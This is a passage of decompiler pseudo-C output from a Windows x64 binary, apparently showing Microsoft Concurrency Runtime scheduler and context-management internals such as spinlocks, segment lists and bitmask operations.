  int v13[2]; // [rsp+20h] [rbp-60h] BYREF
  __int64 v14; // [rsp+28h] [rbp-58h]
  __int64 v15; // [rsp+30h] [rbp-50h]
  int v16[2]; // [rsp+38h] [rbp-48h] BYREF
  __int128 v17; // [rsp+40h] [rbp-40h]
  char v18[8]; // [rsp+50h] [rbp-30h] BYREF
  int v19; // [rsp+58h] [rbp-28h]
  __int64 (__fastcall *v20)(); // [rsp+60h] [rbp-20h]
  char v21[24]; // [rsp+68h] [rbp-18h] BYREF

  v6 = sub_13F14959C(*(_QWORD *)(a1 + 8));
  if ( v6 )
    v7 = *(_QWORD *)(v6 + 8);
  else
    v7 = sub_13F149FE4(*(_QWORD *)(a1 + 8));
  sub_13F155B0C(*(int **)(v7 + 8), (__int64)v13);
  v16[0] = 0;
  v16[1] = 0;
  v8 = v7;
  v17 = 0i64;
  for ( i = a2; !sub_13F15BEFC((__int64)v13, i); i = v11 )
  {
    v7 = sub_13F149FA4(*(_QWORD *)(a1 + 8), 0i64, v7);
    v10 = sub_13F155B0C(*(int **)(v7 + 8), (__int64)v21);
    v13[0] ^= (v13[0] ^ *(_DWORD *)v10) & 0xFFFFFFF;
    v13[0] = *(_DWORD *)v10 ^ (v13[0] ^ *(_DWORD *)v10) & 0xFFFFFFF;
    v14 = *(_QWORD *)(v10 + 8);
    v13[1] = *(_DWORD *)(v10 + 4);
    v15 = *(_QWORD *)(v10 + 16);
    v11 = v16;
    if ( v7 != v8 )
      v11 = a2;
    a2 = v11;
  }
  result = (*(__int64 (__fastcall **)(__int64, int *, __int64))(*(_QWORD *)a1 + 72i64))(a1, a2, v7);
  if ( !result && a3 )
  {
    if ( _InterlockedExchange((volatile __int32 *)(a1 + 16), 1) )
    {
      v19 = 0;
      v20 = sub_13F142C2C;
      do
        sub_13F141BF4((__int64)v18);
      while ( _InterlockedExchange((volatile __int32 *)(a1 + 16), 1) );
    }
    result = (*(__int64 (__fastcall **)(__int64, int *, __int64))(*(_QWORD *)a1 + 72i64))(a1, a2, v7);
    if ( !result )
      result = sub_13F158A14(a1, a2, v7);
    *(_DWORD *)(a1 + 16) = 0;
  }
  return result;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F159198: using guessed type char var_18[24];
// 13F159198: using guessed type char var_30[8];

//----- (000000013F159318) ----------------------------------------------------
__int64 __fastcall sub_13F159318(__int64 a1)
{
  __int64 v1; // rdi
  int v3; // esi
  int v4; // edx
  __int64 v5; // rcx
  __int64 v6; // r8
  int v7; // edx
  _QWORD *v8; // r8
  __int64 v9; // rcx
  int *v10; // rdx

  v1 = 0i64;
  v3 = 0;
  if ( *(int *)(a1 + 272) <= 0 )
  {
LABEL_15:
    LOBYTE(v1) = *(_DWORD *)(a1 + 144) != *(_DWORD *)(a1 + 148);
    return v1;
  }
  while ( 1 )
  {
    v4 = v3 >> *(_DWORD *)(a1 + 244);
    if ( v4 >= *(_DWORD *)(a1 + 268) )
      goto LABEL_14;
    v5 = *(int *)(a1 + 264);
    v6 = *(_QWORD *)(a1 + 256);
    if ( v4 < (int)v5 )
    {
      v8 = *(_QWORD **)(v6 + 8i64 * v4);
    }
    else
    {
      v7 = v4 - v5;
      v8 = *(_QWORD **)(v6 + 8 * v5 - 8);
      if ( v7 >= 0 )
      {
        v9 = (unsigned int)(v7 + 1);
        do
        {
          v8 = (_QWORD *)v8[1];
          --v9;
        }
        while ( v9 );
      }
    }
    v10 = *(int **)(*v8 + 8 * (v3 & (unsigned __int64)(*(int *)(a1 + 240) - 1i64)));
    if ( !v10 )
      goto LABEL_14;
    if ( v10[1] > *v10 || v10[45] > v10[44] )
      return *(_QWORD *)(*v8 + 8 * (v3 & (unsigned __int64)(*(int *)(a1 + 240) - 1i64)));
    if ( v10[36] == 1 )
      sub_13F159678(a1, v10);
LABEL_14:
    if ( ++v3 >= *(_DWORD *)(a1 + 272) )
      goto LABEL_15;
  }
}

//----- (000000013F159414) ----------------------------------------------------
void __fastcall sub_13F159414(__int64 a1, __int64 a2)
{
  sub_13F15701C(a2, a2);
  sub_13F14B404(*(_QWORD *)(*(_QWORD *)(a1 + 424) + 8i64), a2, 0);
}

//----- (000000013F15944C) ----------------------------------------------------
char __fastcall sub_13F15944C(__int64 a1, signed __int64 a2, int a3, char a4)
{
  int v5; // er10
  int v7; // er11
  __int64 v8; // r8
  int v9; // er10
  __int64 v10; // r8
  __int64 v11; // rcx
  unsigned __int16 v12; // ax
  signed __int64 v13; // rdx
  __int64 v14; // rax
  __int64 v15; // r9

  v5 = a3 >> *(_DWORD *)(a1 + 84);
  v7 = a3 & (*(_DWORD *)(a1 + 80) - 1);
  if ( v5 >= *(_DWORD *)(a1 + 108) )
    return 0;
  v8 = *(_QWORD *)(a1 + 96);
  if ( v5 < *(_DWORD *)(a1 + 104) )
  {
    v10 = *(_QWORD *)(v8 + 8i64 * v5);
  }
  else
  {
    v9 = v5 - *(_DWORD *)(a1 + 104);
    v10 = *(_QWORD *)(v8 + 8i64 * *(int *)(a1 + 104) - 8);
    if ( v9 >= 0 )
    {
      v11 = (unsigned int)(v9 + 1);
      do
      {
        v10 = *(_QWORD *)(v10 + 8);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)v10 + 8i64 * v7), 0i64, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 16), v7, -2);
  if ( a4 )
  {
    v12 = MEMORY[0x771A31E0](a1);
    v13 = a2 + 16;
    if ( v12 <= *(int *)(a1 + 116) )
    {
      MEMORY[0x771C4CC0](a1, v13);
    }
    else
    {
      MEMORY[0x771C4CC0](a1 + 16, v13);
      if ( (unsigned __int16)MEMORY[0x771A31E0](a1 + 16) > *(int *)(a1 + 116)
        && !sub_13F14A2E4(*(_QWORD *)(a1 + 72))
        && !_InterlockedCompareExchange((volatile signed __int32 *)(a1 + 120), 1, 0) )
      {
        v14 = MEMORY[0x771B51E0](a1 + 16);
        v15 = *(_QWORD *)(a1 + 72);
        *(_QWORD *)(a1 + 32) = v14;
        sub_13F14AA74(
          (__int64 (__fastcall **)(__int64))(a1 + 40),
          (__int64 (__fastcall *)(__int64))sub_13F1589C0,
          (__int64 (__fastcall *)(__int64))a1,
          v15);
      }
    }
  }
  return 1;
}

//----- (000000013F15958C) ----------------------------------------------------
char __fastcall sub_13F15958C(signed __int64 a1)
{
  sub_13F14B8AC(*(_QWORD *)(*(_QWORD *)(a1 + 424) + 8i64), a1 + 448);
  return sub_13F157E94(*(_QWORD *)(a1 + 16), a1);
}

//----- (000000013F1595C0) ----------------------------------------------------
char __fastcall sub_13F1595C0(__int64 a1)
{
  signed __int64 v2; // rcx
  signed __int64 v3; // rbx
  char result; // al
  signed __int64 v5; // rcx
  signed __int64 v6; // rbx

  v2 = *(_QWORD *)(a1 + 32);
  if ( v2 )
  {
    do
    {
      v3 = *(_QWORD *)(v2 + 432);
      result = sub_13F15958C(v2);
      v2 = v3;
    }
    while ( v3 );
  }
  v5 = *(_QWORD *)(a1 + 24);
  if ( v5 )
  {
    do
    {
      v6 = *(_QWORD *)(v5 + 432);
      result = sub_13F15958C(v5);
      v5 = v6;
    }
    while ( v6 );
  }
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_QWORD *)(a1 + 24) = 0i64;
  return result;
}

//----- (000000013F15961C) ----------------------------------------------------
char __fastcall sub_13F15961C(__int64 a1, signed __int64 a2)
{
  signed __int32 v3; // eax
  signed __int64 v4; // rbx

  LOBYTE(v3) = sub_13F14ED5C(a1 + 160, a2, *(_DWORD *)(a2 + 164), 1);
  v4 = *(_QWORD *)(a1 + 424);
  if ( (*(_BYTE *)(v4 + 80) & 4) == 0 )
  {
    v3 = _InterlockedExchangeAdd((volatile signed __int32 *)(v4 + 40), 0xFFFFFFFF);
    if ( v3 == 1 )
    {
      (*(void (__fastcall **)(signed __int64))(*(_QWORD *)v4 + 56i64))(v4);
      LOBYTE(v3) = sub_13F14B92C(*(_QWORD *)(v4 + 8), v4);
    }
  }
  return v3;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F159678) ----------------------------------------------------
char __fastcall sub_13F159678(__int64 a1, int *a2)
{
  if ( sub_13F15944C(a1 + 288, (signed __int64)(a2 + 24), a2[24], 0) )
  {
    if ( a2[45] <= a2[44] )
    {
      sub_13F15AC04((__int64)a2, a1);
      return 1;
    }
    sub_13F15AB70((__int64)a2, a1);
  }
  return 0;
}

//----- (000000013F1596D8) ----------------------------------------------------
__int64 __fastcall sub_13F1596D8(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v6; // rax

  v4 = a3;
  LOBYTE(a3) = 1;
  v6 = (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 40i64))(a1, a4, a3);
  return sub_13F159750(v6, a2, v4);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F159714) ----------------------------------------------------
__int64 __fastcall sub_13F159714(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v5; // rax

  v3 = a3;
  LOBYTE(a3) = 1;
  v5 = (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 40i64))(a1, a1 + 56, a3);
  return sub_13F159750(v5, a2, v3);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F159750) ----------------------------------------------------
__int64 __fastcall sub_13F159750(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned int *v4; // rsi
  _QWORD *v5; // rbp
  __int64 v6; // rcx
  __int64 v7; // rax
  __int64 v8; // rbx
  __int64 v9; // rax
  _DWORD *v10; // rbx
  _DWORD *v11; // rax
  __int64 result; // rax
  int v13[2]; // [rsp+28h] [rbp-40h] BYREF
  __int64 v14; // [rsp+30h] [rbp-38h]
  __int64 v15; // [rsp+38h] [rbp-30h]
  __int64 pExceptionObject[4]; // [rsp+40h] [rbp-28h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"proc");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = *(unsigned int **)(*(_QWORD *)(a1 + 424) + 8i64);
  v5 = sub_13F14A040((__int64)v4, a2, a3);
  v6 = *(_QWORD *)(a1 + 424);
  if ( (*(_BYTE *)(v6 + 80) & 4) == 0 )
    _InterlockedIncrement((volatile signed __int32 *)(v6 + 40));
  sub_13F142BD8((volatile __int32 *)(a1 + 88));
  v5[4] = 0i64;
  **(_QWORD **)(a1 + 80) = v5;
  *(_QWORD *)(a1 + 80) = v5 + 4;
  sub_13F142C20((_DWORD *)(a1 + 88));
  v7 = sub_13F1492D4();
  v8 = v7;
  if ( v7 && (unsigned int *)sub_13F102FE0(v7) == v4 )
  {
    v9 = *(_QWORD *)(v8 + 248);
    if ( *(_BYTE *)(v8 + 136) )
      ++*(_DWORD *)(v9 + 32);
    else
      ++*(_DWORD *)(v9 + 160);
  }
  else
  {
    v10 = (_DWORD *)sub_13F142818(v4[8]);
    if ( !v10 )
    {
      v11 = (_DWORD *)sub_13F14059C(64i64);
      v10 = v11;
      if ( v11 )
      {
        v11[8] = 0;
        v11[9] = 0;
        v11[10] = 0;
        v11[11] = 0;
        v11[12] = 1;
      }
      else
      {
        v10 = 0i64;
      }
      sub_13F158588((__int64)(v4 + 84), v10);
      sub_13F142820();
    }
    ++v10[8];
  }
  if ( (*(_DWORD *)(a1 + 24) & 0xFFFFFFF) != 0 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 8i64))(a1);
  result = v4[170];
  if ( (int)(v4[169] - result) > 0 )
  {
    v13[0] = *(_DWORD *)(a1 + 24);
    v14 = *(_QWORD *)(a1 + 32);
    v13[1] = *(_DWORD *)(a1 + 28);
    v15 = *(_QWORD *)(a1 + 40);
    return (*(__int64 (__fastcall **)(unsigned int *, __int64, int *))(*(_QWORD *)v4 + 112i64))(v4, a1, v13);
  }
  return result;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F159750: using guessed type _QWORD pExceptionObject[4];

//----- (000000013F1598F8) ----------------------------------------------------
__int64 __fastcall sub_13F1598F8(__int64 a1, char a2)
{
  int v2; // er12
  char v3; // r14
  int v6; // er15
  int v7; // esi
  __int64 v8; // rbp
  int v9; // edx
  __int64 v10; // rcx
  __int64 v11; // r8
  int v12; // edx
  _QWORD *v13; // r8
  __int64 v14; // rcx
  _DWORD *v15; // rdi
  bool v16; // al
  __int64 result; // rax
  __int64 v18; // rsi
  int v19; // edx
  __int64 v20; // rcx
  __int64 v21; // r8
  int v22; // edx
  _QWORD *v23; // r8
  __int64 v24; // rcx
  _DWORD *v25; // rdi
  bool v26; // al
  int i; // edi
  int v28; // edx
  __int64 v29; // rcx
  __int64 v30; // r8
  int v31; // edx
  _QWORD *v32; // r8
  __int64 v33; // rcx
  int *v34; // rdx
  char v35[8]; // [rsp+20h] [rbp-98h] BYREF
  __int64 v36[9]; // [rsp+28h] [rbp-90h] BYREF

  v2 = *(_DWORD *)(a1 + 272);
  v3 = 0;
  if ( v2 > 0 )
  {
    v6 = 0;
    v7 = 0;
    v35[0] = 0;
    v8 = 0i64;
    while ( 1 )
    {
      v9 = v7 >> *(_DWORD *)(a1 + 244);
      if ( v9 >= *(_DWORD *)(a1 + 268) )
        goto LABEL_25;
      v10 = *(int *)(a1 + 264);
      v11 = *(_QWORD *)(a1 + 256);
      if ( v9 < (int)v10 )
      {
        v13 = *(_QWORD **)(v11 + 8i64 * v9);
      }
      else
      {
        v12 = v9 - v10;
        v13 = *(_QWORD **)(v11 + 8 * v10 - 8);
        if ( v12 >= 0 )
        {
          v14 = (unsigned int)(v12 + 1);
          do
          {
            v13 = (_QWORD *)v13[1];
            --v14;
          }
          while ( v14 );
        }
      }
      v15 = *(_DWORD **)(*v13 + 8 * (v7 & (unsigned __int64)(*(int *)(a1 + 240) - 1i64)));
      if ( !v15 )
        goto LABEL_25;
      if ( v15[1] <= *v15 && v15[45] <= v15[44] )
        break;
      result = sub_13F15AD88((__int64)v15, a2, v35);
      v36[0] = result;
      if ( result )
        return result;
      if ( v35[0] )
        goto LABEL_19;
      if ( v8 >= 15 )
      {
        result = sub_13F15AC4C((__int64)v15, a2);
        v36[0] = result;
        if ( result )
          return result;
LABEL_19:
        v16 = v15[36] == 1 && v15[1] <= *v15 && v15[45] <= v15[44];
LABEL_24:
        v3 |= v16;
        goto LABEL_25;
      }
      ++v6;
      *((_DWORD *)&v36[1] + v8++) = v7;
LABEL_25:
      if ( ++v7 >= v2 )
      {
        if ( v6 >= 1i64 )
        {
          v18 = 0i64;
          while ( 1 )
          {
            v19 = *((int *)&v36[1] + v18) >> *(_DWORD *)(a1 + 244);
            if ( v19 < *(_DWORD *)(a1 + 268) )
            {
              v20 = *(int *)(a1 + 264);
              v21 = *(_QWORD *)(a1 + 256);
              if ( v19 < (int)v20 )
              {
                v23 = *(_QWORD **)(v21 + 8i64 * v19);
              }
              else
              {
                v22 = v19 - v20;
                v23 = *(_QWORD **)(v21 + 8 * v20 - 8);
                if ( v22 >= 0 )
                {
                  v24 = (unsigned int)(v22 + 1);
                  do
                  {
                    v23 = (_QWORD *)v23[1];
                    --v24;
                  }
                  while ( v24 );
                }
              }
              v25 = *(_DWORD **)(*v23 + 8 * (*((int *)&v36[1] + v18) & (unsigned __int64)(*(int *)(a1 + 240) - 1i64)));
              if ( v25 )
              {
                if ( v25[1] > *v25 || v25[45] > v25[44] )
                {
                  result = sub_13F15AC4C((__int64)v25, a2);
                  v36[0] = result;
                  if ( result )
                    return result;
                }
                v26 = v25[36] == 1 && v25[1] <= *v25 && v25[45] <= v25[44];
                v3 |= v26;
              }
            }
            if ( ++v18 >= v6 )
              goto LABEL_46;
          }
        }
        goto LABEL_46;
      }
    }
    v16 = v15[36] == 1;
    goto LABEL_24;
  }
LABEL_46:
  if ( sub_13F158B94(a1 + 96, v36) )
  {
    sub_13F15B180(v36[0], 1);
    return v36[0];
  }
  else
  {
    if ( *(int *)(a1 + 400) > 0 )
    {
      if ( v3 )
      {
        for ( i = 0; i < *(_DWORD *)(a1 + 272); ++i )
        {
          v28 = i >> *(_DWORD *)(a1 + 244);
          if ( v28 < *(_DWORD *)(a1 + 268) )
          {
            v29 = *(int *)(a1 + 264);
            v30 = *(_QWORD *)(a1 + 256);
            if ( v28 < (int)v29 )
            {
              v32 = *(_QWORD **)(v30 + 8i64 * v28);
            }
            else
            {
              v31 = v28 - v29;
              v32 = *(_QWORD **)(v30 + 8 * v29 - 8);
              if ( v31 >= 0 )
              {
                v33 = (unsigned int)(v31 + 1);
                do
                {
                  v32 = (_QWORD *)v32[1];
                  --v33;
                }
                while ( v33 );
              }
            }
            v34 = *(int **)(*v32 + 8 * (i & (unsigned __int64)(*(int *)(a1 + 240) - 1i64)));
            if ( v34 && v34[36] == 1 && v34[45] <= v34[44] )
              sub_13F159678(a1, v34);
          }
        }
      }
    }
    return 0i64;
  }
}
// 13F1598F8: using guessed type char var_98[8];

//----- (000000013F159C44) ----------------------------------------------------
__int64 __fastcall sub_13F159C44(int *a1, __int64 a2, __int64 a3)
{
  int v3; // eax
  unsigned __int64 v7; // r9
  unsigned __int128 v8; // rax
  __int64 v9; // rax
  unsigned __int64 v10; // r8
  __int64 v11; // r8
  unsigned int v12; // eax
  __int64 v13; // r9

  v3 = *a1;
  *(_DWORD *)a2 = *a1;
  v7 = (unsigned __int64)(unsigned int)(v3 + 31) >> 5;
  v8 = v7 * (unsigned __int128)4ui64;
  if ( !is_mul_ok(v7, 4ui64) )
    *(_QWORD *)&v8 = -1i64;
  v9 = sub_13F1790C4(v8, *((_QWORD *)&v8 + 1));
  v10 = (unsigned int)(*(_DWORD *)a2 + 31);
  *(_QWORD *)(a2 + 8) = v9;
  sub_13F15EF70(v9, 0, 4 * (v10 >> 5));
  v11 = 0i64;
  v12 = (unsigned int)(*a1 + 31) >> 5;
  if ( v12 )
  {
    v13 = v12;
    do
    {
      *(_DWORD *)(v11 + *(_QWORD *)(a2 + 8)) = *(_DWORD *)(*((_QWORD *)a1 + 1) + v11) & *(_DWORD *)(v11
                                                                                                  + *(_QWORD *)(a3 + 8));
      v11 += 4i64;
      --v13;
    }
    while ( v13 );
  }
  return a2;
}
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F159CE8) ----------------------------------------------------
__int64 __fastcall sub_13F159CE8(__int64 a1, __int64 a2)
{
  _DWORD *v4; // rsi

  v4 = (_DWORD *)(a1 + 512);
  sub_13F142BD8((volatile __int32 *)(a1 + 512));
  *(_QWORD *)(a2 + 360) = 0i64;
  **(_QWORD **)(a1 + 504) = a2;
  *(_QWORD *)(a1 + 504) = a2 + 360;
  return sub_13F142C20(v4);
}

//----- (000000013F159D4C) ----------------------------------------------------
__int64 __fastcall sub_13F159D4C(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rax
  __int64 v7; // r8
  __int64 result; // rax
  char v9[8]; // [rsp+20h] [rbp-28h] BYREF
  int v10; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v11)(); // [rsp+30h] [rbp-18h]

  if ( _InterlockedExchange((volatile __int32 *)(a1 + 56), 1) )
  {
    v10 = 0;
    v11 = sub_13F142C2C;
    do
      sub_13F141BF4((__int64)v9);
    while ( _InterlockedExchange((volatile __int32 *)(a1 + 56), 1) );
  }
  v6 = sub_13F1590E0(a1, *(_DWORD *)(a1 + 52), 1);
  v7 = (unsigned int)(*(_DWORD *)(a1 + 52) - *(_DWORD *)(v6 + 32));
  *(_QWORD *)(*(_QWORD *)(v6 + 24) + 8 * v7) = a3;
  _InterlockedIncrement((volatile signed __int32 *)(a1 + 52));
  *(_DWORD *)(a1 + 56) = 0;
  *(_QWORD *)a2 = v6;
  result = a2;
  *(_DWORD *)(a2 + 8) = v7;
  return result;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F159D4C: using guessed type char var_28[8];

//----- (000000013F159DDC) ----------------------------------------------------
__int64 __fastcall sub_13F159DDC(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 *a5)
{
  __int64 v5; // rbx
  __int64 v7; // rax

  v5 = a3;
  LOBYTE(a3) = 1;
  v7 = (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 40i64))(a1, a4, a3);
  *a5 = v7;
  sub_13F159D4C(v7 + 96, a2, v5);
  return a2;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F159E24) ----------------------------------------------------
signed __int64 __fastcall sub_13F159E24(signed __int64 a1)
{
  __int64 v2; // rdi
  signed __int64 result; // rax
  __int64 v4; // rdx

  v2 = *(_QWORD *)(*(_QWORD *)(a1 + 424) + 8i64);
  sub_13F159E88(v2, a1 + 48);
  result = *(_DWORD *)(a1 + 24) & 0xFFFFFFF;
  if ( (_DWORD)result == 3 )
  {
    result = *(_QWORD *)(v2 + 160);
    v4 = (unsigned int)(16 * *(_DWORD *)(a1 + 64));
    if ( !*(_QWORD *)(result + 8 * v4) )
      return _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)(v2 + 160) + 8 * v4), a1, 0i64);
  }
  return result;
}

//----- (000000013F159E88) ----------------------------------------------------
__int64 __fastcall sub_13F159E88(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  unsigned int v3; // er9
  __int64 result; // rax
  unsigned int v7; // er10
  __int64 v8; // rdx
  __int64 v9; // rdx
  __int64 v10; // r9
  unsigned int v11; // ecx
  __int64 v12; // r8
  char v13[8]; // [rsp+20h] [rbp-18h] BYREF
  __int64 v14; // [rsp+28h] [rbp-10h]

  v2 = 0i64;
  v3 = (unsigned int)(*(_DWORD *)a2 + 31) >> 5;
  result = 0i64;
  v7 = 0;
  if ( v3 )
  {
    while ( !(_DWORD)result )
    {
      v8 = v7++;
      result = (unsigned int)(*(_DWORD *)(*(_QWORD *)(a1 + 128) + 4 * v8) & *(_DWORD *)(*(_QWORD *)(a2 + 8) + 4 * v8));
      if ( v7 >= v3 )
      {
        if ( !(_DWORD)result )
          return result;
        break;
      }
    }
    v10 = sub_13F159C44((int *)a2, (__int64)v13, a1 + 120);
    v11 = (unsigned int)(*(_DWORD *)(a1 + 144) + 31) >> 5;
    if ( v11 )
    {
      v9 = 0i64;
      v12 = v11;
      do
      {
        _InterlockedOr((volatile signed __int32 *)(v9 + *(_QWORD *)(a1 + 152)), *(_DWORD *)(v2 + *(_QWORD *)(v10 + 8)));
        v9 += 4i64;
        v2 += 4i64;
        --v12;
      }
      while ( v12 );
    }
    return sub_13F14088C(v14, v9);
  }
  return result;
}
// 13F159F1F: variable 'v9' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F159E88: using guessed type char var_18[8];

//----- (000000013F159F30) ----------------------------------------------------
__int64 __fastcall sub_13F159F30(__int64 a1, __int64 a2, __int64 a3)
{
  bool v3; // zf
  _DWORD v5[2]; // [rsp+20h] [rbp-28h] BYREF
  __int128 v6; // [rsp+28h] [rbp-20h]

  v5[0] = 0;
  v5[1] = 0;
  v3 = (*(_BYTE *)(a1 + 80) & 4) == 0;
  v6 = 0i64;
  if ( v3 )
    return *(_QWORD *)(a1 + 112);
  else
    return sub_13F158D14(a1, (__int64)v5, a3);
}

//----- (000000013F159F64) ----------------------------------------------------
signed __int64 __fastcall sub_13F159F64(__int64 a1, __int64 a2, char a3)
{
  bool v4; // zf
  signed __int64 result; // rax
  __int64 v6; // rax
  int v7[2]; // [rsp+20h] [rbp-38h] BYREF
  __int128 v8; // [rsp+28h] [rbp-30h]
  char v9[8]; // [rsp+38h] [rbp-20h] BYREF
  int v10; // [rsp+40h] [rbp-18h]
  __int64 (__fastcall *v11)(); // [rsp+48h] [rbp-10h]

  v7[0] = 0;
  v7[1] = 0;
  v4 = (*(_BYTE *)(a1 + 80) & 4) == 0;
  v8 = 0i64;
  if ( !v4 )
    return sub_13F159198(a1, v7, a3);
  result = *(_QWORD *)(a1 + 112);
  if ( a3 && !result )
  {
    if ( _InterlockedExchange((volatile __int32 *)(a1 + 16), 1) )
    {
      v10 = 0;
      v11 = sub_13F142C2C;
      do
        sub_13F141BF4((__int64)v9);
      while ( _InterlockedExchange((volatile __int32 *)(a1 + 16), 1) );
    }
    result = *(_QWORD *)(a1 + 112);
    if ( !result )
    {
      v6 = sub_13F149FE4(*(_QWORD *)(a1 + 8));
      result = sub_13F158A14(a1, v7, v6);
      *(_QWORD *)(a1 + 112) = result;
    }
    *(_DWORD *)(a1 + 16) = 0;
  }
  return result;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F159F64: using guessed type char var_20[8];

//----- (000000013F15A004) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A004(_QWORD *a1, __int64 a2, char a3)
{
  _DWORD *v5; // rax
  _DWORD *v6; // rdx

  sub_13F14DC58((__int64)a1, a2, 1);
  *a1 = &Concurrency::details::ExternalContextBase::`vftable';
  a1[32] = 0i64;
  a1[33] = 0i64;
  a1[34] = sub_13F1422EC();
  a1[6] = sub_13F149AC8(a1[7]);
  v5 = (_DWORD *)sub_13F14059C(64i64);
  v6 = v5;
  if ( v5 )
  {
    v5[8] = 0;
    v5[9] = 0;
    v5[10] = 0;
    v5[11] = 0;
    v5[12] = 1;
  }
  else
  {
    v6 = 0i64;
  }
  a1[31] = v6;
  sub_13F158588(a1[7] + 336i64, v6);
  sub_13F15A358((__int64)a1, a3);
  return a1;
}
// 13F18BF60: using guessed type void *Concurrency::details::ExternalContextBase::`vftable';

//----- (000000013F15A0C4) ----------------------------------------------------
void **__fastcall sub_13F15A0C4(_QWORD *a1, __int64 a2)
{
  __int64 v3; // rdx

  *a1 = &Concurrency::details::ExternalContextBase::`vftable';
  sub_13F15A1F4(a1, a2);
  return sub_13F14DE6C((__int64)a1, v3);
}
// 13F15A0EE: variable 'v3' is possibly undefined
// 13F18BF60: using guessed type void *Concurrency::details::ExternalContextBase::`vftable';

//----- (000000013F15A0F4) ----------------------------------------------------
_QWORD *__fastcall sub_13F15A0F4(_QWORD *a1, __int64 a2)
{
  char v2; // bl

  v2 = a2;
  sub_13F15A0C4(a1, a2);
  if ( (v2 & 1) != 0 )
    sub_13F14088C(a1, 288i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F15A128) ----------------------------------------------------
__int64 *__fastcall sub_13F15A128(__int64 a1, __int64 a2)
{
  __int64 v2; // rax

  v2 = *(_QWORD *)(a1 + 256);
  if ( v2 )
    return sub_13F155CE4(v2, a2);
  v2 = sub_13F14A0BC(1);
  *(_QWORD *)(a1 + 256) = v2;
  if ( v2 )
    return sub_13F155CE4(v2, a2);
  else
    return (__int64 *)sub_13F155E28(a2);
}

//----- (000000013F15A178) ----------------------------------------------------
__int64 __fastcall sub_13F15A178(__int64 a1)
{
  __int64 result; // rax

  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 56) + 8i64))(*(_QWORD *)(a1 + 56));
  result = (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(a1 + 84));
  if ( (_DWORD)result == 1 )
    return MEMORY[0x76F91980](*(_QWORD *)(a1 + 272), 0xFFFFFFFFi64, 0i64);
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;

//----- (000000013F15A1F4) ----------------------------------------------------
__int64 __fastcall sub_13F15A1F4(_QWORD *a1, __int64 a2)
{
  __int64 v3; // rcx
  __int64 result; // rax

  sub_13F14E47C((__int64)a1, a2);
  if ( a1[33] )
  {
    MEMORY[0x76F91910]();
    a1[33] = 0i64;
  }
  if ( a1[34] )
    MEMORY[0x76F91910]();
  v3 = a1[32];
  if ( v3 )
    sub_13F14BAE0(v3);
  result = a1[31];
  a1[31] = 0i64;
  *(_DWORD *)(result + 48) = 0;
  return result;
}

//----- (000000013F15A25C) ----------------------------------------------------
char __fastcall sub_13F15A25C(__int64 a1, __int64 a2)
{
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 v6; // rdx

  v4 = *(_QWORD *)(a1 + 256);
  if ( v4 )
    return sub_13F155D88(v4, a2);
  v5 = sub_13F14A0BC(1);
  *(_QWORD *)(a1 + 256) = v5;
  v4 = v5;
  if ( v5 )
    return sub_13F155D88(v4, a2);
  else
    return sub_13F14088C(a2 - 8, v6);
}
// 13F15A29C: variable 'v6' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F15A2AC) ----------------------------------------------------
__int64 sub_13F15A2AC()
{
  return 0xFFFFFFFFi64;
}
// 13F15A2AC: using guessed type __int64 __fastcall sub_13F15A2AC();

//----- (000000013F15A2B0) ----------------------------------------------------
__int64 __fastcall sub_13F15A2B0(__int64 a1, __int64 a2)
{
  sub_13F149264(*(volatile signed __int32 **)(a2 + 56), a2, 0);
  return sub_13F142B8C();
}

//----- (000000013F15A2E4) ----------------------------------------------------
__int64 __fastcall sub_13F15A2E4(__int64 a1)
{
